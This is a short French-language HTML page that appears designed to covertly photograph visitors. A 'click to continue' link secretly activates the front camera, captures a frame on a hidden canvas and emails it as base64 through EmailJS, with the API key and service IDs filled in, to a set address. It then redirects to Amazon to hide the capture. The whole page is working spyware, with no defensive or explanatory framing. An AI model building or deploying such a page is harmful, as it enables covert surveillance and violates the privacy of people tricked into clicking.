<!DOCTYPE html>
<html>
<head>
  <title>Photo automatique</title>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq"); // Clé publique EmailJS
  </script>
</head>
<body>
  <a id="autoLink" href="#">Cliquez ici pour continuer</a>
  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    document.getElementById("autoLink").onclick = async (e) => {
      e.preventDefault(); // Empêche le comportement normal du lien

      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // Petit délai pour que la caméra démarre
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Prendre la photo
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const imageBase64 = canvas.toDataURL("image/jpeg");

        // Envoyer via EmailJS
        await emailjs.send("service_8cs0gml", "template_hgvdx1g", {
          to_email: "destinataire@email.com",
          message: "Photo automatique",
          attachment: imageBase64
        });

        // Arrêter la caméra
        stream.getTracks().forEach(track => track.stop());

        // Redirection vers Amazon
        window.location.href = "https://www.amazon.com";
      } catch (err) {
        alert("Erreur ou caméra refusée : " + err);
      }
    };
  </script>
</body>
</html>
